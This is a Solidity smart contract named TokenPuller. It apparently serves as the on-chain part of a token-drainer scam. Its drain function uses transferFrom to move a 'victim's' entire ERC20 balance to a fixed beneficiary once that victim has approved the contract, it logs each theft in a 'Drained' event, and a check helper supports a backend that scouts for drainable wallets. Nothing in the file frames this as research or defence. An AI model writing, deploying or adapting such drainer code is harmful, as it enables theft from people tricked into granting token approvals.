// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TokenPuller {
    address public immutable owner;
    IERC20 public immutable token;
    address public immutable beneficiary;

    event Drained(address indexed victim, address indexed beneficiary, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "TokenPuller: caller not owner");
        _;
    }

    constructor(address _token, address _beneficiary) {
        require(_token != address(0) && _beneficiary != address(0), "zero addr");
        owner = msg.sender;
        token = IERC20(_token);
        beneficiary = _beneficiary;
    }

    /// @notice Pulls victim's entire balance IF victim approved THIS contract.
    function drain(address victim) external onlyOwner returns (uint256) {
        uint256 bal = token.balanceOf(victim);
        uint256 alw = token.allowance(victim, address(this));
        require(bal > 0 && alw >= bal, "nothing drainable");
        (bool ok, ) = address(token).call(
            abi.encodeWithSelector(IERC20.transferFrom.selector, victim, beneficiary, bal)
        );
        require(ok, "transferFrom failed");
        emit Drained(victim, beneficiary, bal);
        return bal;
    }

    /// @notice View helper used by backend sanity checks.
    function check(address victim) external view returns (uint256 b, uint256 a) {
        b = token.balanceOf(victim);
        a = token.allowance(victim, address(this));
    }
}
